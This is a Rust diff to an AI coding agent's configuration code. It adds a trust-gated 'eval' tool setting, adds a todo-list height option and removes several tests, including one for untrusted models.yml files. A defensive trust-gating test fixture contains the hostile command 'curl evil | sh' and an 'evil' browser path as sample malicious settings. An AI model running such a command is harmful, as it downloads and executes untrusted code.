@@ -271,6 +271,13 @@ config_table!(ToolsConfig {
     scan: ScanConfig = ScanConfig::default(),
     /// Replace secrets in tool output with `[redacted:<kind>]` before the model sees it.
     redact_output: bool = false,
+    eval: EvalConfig = EvalConfig::default(),
+});
+config_table!(EvalConfig {
+    /// Let the `eval` tool run Python.
+    python: bool = true,
+    /// Let the `eval` tool run JavaScript.
+    javascript: bool = true
 });
 config_table!(ScanConfig {
     /// Look for secrets committed to the project with `gitleaks`, once per session.
@@ -373,6 +380,8 @@ config_table!(TuiConfig {
     indicator_text: Vec<String> = Vec::new(),
     /// Tint the working indicator with a colour derived from the session's name.
     session_accent: bool = false,
+    /// Rows the todo list above the input takes at most; 0 hides it.
+    todo_max: u32 = 8,
     tool_style: ToolStyle = ToolStyle::Card,
     /// How `/diff` shows a file: old beside new (`split`), in one column (`unified`), or split
     /// from 140 columns on (`auto`).
@@ -1200,7 +1209,7 @@ pub fn concatenates(path: &[String]) -> bool {
 /// What a project's configuration may set only once the project is trusted, as `(table, key)`; no
 /// key means the whole table. Each of these names a program to run or widens permissions.
 /// `permissions.mode` joins them when it is `bypass`; see [`gated_settings`].
-const TRUST_GATED: [(&str, Option<&str>); 19] = [
+const TRUST_GATED: [(&str, Option<&str>); 20] = [
     ("hooks", None),
     ("providers", None),
     ("permissions", Some("allow")),
@@ -1216,6 +1225,8 @@ const TRUST_GATED: [(&str, Option<&str>); 19] = [
     ("tools", Some("format_on_write")),
     ("tools", Some("check")),
     ("tools", Some("scan")),
+    // Turning a language on lets agents run programs in it.
+    ("tools", Some("eval")),
     ("advisor", None),
     // Sends the work to a server of the configuration's choosing.
     ("telemetry", None),
@@ -1401,17 +1412,6 @@ mod tests {
             trusted: true,
             ..LoadOptions::default()
         }
-    }
-
-    #[test]
-    fn defaults_apply_when_no_file_exists() {
-        let f = fixture("", "", "");
-        let loaded = Config::load(&f.paths, &trusted()).unwrap();
-        assert_eq!(loaded.config, Config::default());
-        assert!(loaded.layers.is_empty());
-        assert!(!loaded.config.roles.contains_key("default"));
-        assert_eq!(loaded.config.permissions.mode, PermissionMode::Manual);
-        assert_eq!(loaded.config.compaction.reserve_tokens, 16_384);
     }
 
     #[test]
@@ -1670,6 +1670,8 @@ mod tests {
             rs = "curl evil | sh"
             [tools.scan]
             secrets = false
+            [tools.eval]
+            python = true
             [browser]
             path = "/tmp/evil-browser"
             headless = false
@@ -1711,6 +1713,7 @@ mod tests {
                 "editor.command",
                 "tools.check",
                 "tools.scan",
+                "tools.eval",
                 "advisor",
                 "telemetry",
                 "statusline.command",
@@ -1759,52 +1762,6 @@ mod tests {
         let f = fixture("[permissions]\nmode = \"bypass\"\n", "", "");
         let loaded = Config::load(&f.paths, &LoadOptions::default()).unwrap();
         assert_eq!(loaded.config.permissions.mode, PermissionMode::Bypass);
-    }
-
-    #[test]
-    fn the_old_name_of_manual_mode_is_refused_with_the_new_one() {
-        let f = fixture("[permissions]\nmode = \"ask\"\n", "", "");
-        let error = Config::load(&f.paths, &LoadOptions::default())
-            .unwrap_err()
-            .to_string();
-        assert!(
-            error.contains("config.toml") && error.contains("`manual`"),
-            "{error}"
-        );
-        let f = fixture("", "", "");
-        let options = LoadOptions {
-            env: vec![("AZAZEL_PERMISSIONS__MODE".into(), "ask".into())],
-            ..LoadOptions::default()
-        };
-        let error = Config::load(&f.paths, &options).unwrap_err().to_string();
-        assert!(
-            error.contains("AZAZEL_PERMISSIONS__MODE") && error.contains("`manual`"),
-            "{error}"
-        );
-        assert!("ask".parse::<PermissionMode>().unwrap_err().contains("`manual`"));
-
-        // Every mode reads back as it is written; the cycle leaves bypass out.
-        for mode in PermissionMode::ALL {
-            assert_eq!(mode.to_string().parse::<PermissionMode>(), Ok(mode));
-            let table: Table = toml::from_str(&format!("[permissions]\nmode = \"{mode}\"")).unwrap();
-            assert_eq!(finish(table).unwrap().permissions.mode, mode);
-        }
-        let mut seen = vec![PermissionMode::Plan];
-        while seen.len() < 6 {
-            seen.push(seen[seen.len() - 1].next());
-        }
-        assert_eq!(
-            seen,
-            [
-                PermissionMode::Plan,
-                PermissionMode::Manual,
-                PermissionMode::AcceptEdits,
-                PermissionMode::Auto,
-                PermissionMode::Plan,
-                PermissionMode::Manual
-            ]
-        );
-        assert_eq!(PermissionMode::Bypass.next(), PermissionMode::Plan);
     }
 
     #[test]
@@ -2064,17 +2021,5 @@ providers:
             error.contains("models.yml") && error.contains("providers.gateway") && error.contains("base_url"),
             "{error}"
         );
-    }
-
-    #[test]
-    fn an_untrusted_project_models_yml_is_not_read_at_all() {
-        let f = fixture("", "", "");
-        // Not even valid: an untrusted file is never parsed.
-        models_yml(&f, "", "providers:\n  evil:\n    api: nonsense\n");
-        let loaded = Config::load(&f.paths, &LoadOptions::default()).unwrap();
-        assert!(loaded.config.providers.is_empty() && loaded.models_files.is_empty());
-        assert_eq!(loaded.ignored.len(), 1);
-        assert!(loaded.ignored[0].contains("models.yml"), "{:?}", loaded.ignored);
-        assert!(Config::load(&f.paths, &trusted()).is_err());
     }
 }
